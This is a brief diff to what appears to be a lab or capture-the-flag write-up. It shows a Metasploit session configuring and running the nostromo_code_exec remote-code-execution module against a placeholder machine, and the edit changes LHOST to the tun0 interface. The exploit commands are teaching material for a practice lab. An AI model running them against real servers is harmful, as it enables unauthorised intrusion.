@@ -77,7 +77,7 @@ msf6 exploit(multi/http/nostromo_code_exec) > set RHOSTS <MACHINE_IP>
 RHOSTS => <MACHINE_IP>
 msf6 exploit(multi/http/nostromo_code_exec) > set RPORT 80
 RPORT => 80
-msf6 exploit(multi/http/nostromo_code_exec) > set LHOST <OPENVPN_IP>
+msf6 exploit(multi/http/nostromo_code_exec) > set LHOST tun0
 LHOST => <OPENVPN_IP>
 msf6 exploit(multi/http/nostromo_code_exec) > run
 
